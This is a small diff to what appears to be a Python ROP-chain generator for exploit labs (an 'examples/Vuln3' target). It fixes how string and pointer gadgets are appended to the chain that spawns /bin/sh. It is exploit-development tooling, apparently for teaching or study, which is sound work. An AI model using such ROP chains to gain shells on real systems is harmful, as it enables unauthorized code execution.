@@ -13,7 +13,7 @@ parser = argparse.ArgumentParser(
 )
 parser.add_argument("--command", default="/bin/sh")
 parser.add_argument("--envp", default="")
-parser.add_argument("--out-rop-path", default=None)
+parser.add_argument("--out-rop-path", default=Path("examples/Vuln3/Vuln3-32/out-rop.txt"))
 
 
 def main(args):
@@ -92,7 +92,7 @@ def push_array_of_strings(array, gadgets, data_address, rop_chain):
 
         # Push chunks onto the stack.
         for chunk in chunks:
-            push_string(gadgets, stack_pointer, chunk.encode('utf-8'))
+            rop_chain += push_string(gadgets, stack_pointer, chunk.encode('utf-8'))
             stack_pointer += 4
         # Terminate strings with null.
         rop_chain += push_null(gadgets, stack_pointer)
@@ -101,7 +101,7 @@ def push_array_of_strings(array, gadgets, data_address, rop_chain):
     array_pointer = stack_pointer
     # Push pointers to strings onto the stack.
     for pointer in pointers:
-        push_item(gadgets, stack_pointer, pointer)
+        rop_chain += push_item(gadgets, stack_pointer, pointer)
         stack_pointer += 4
     # Terminate the array of pointers with null.
     rop_chain += push_null(gadgets, stack_pointer)
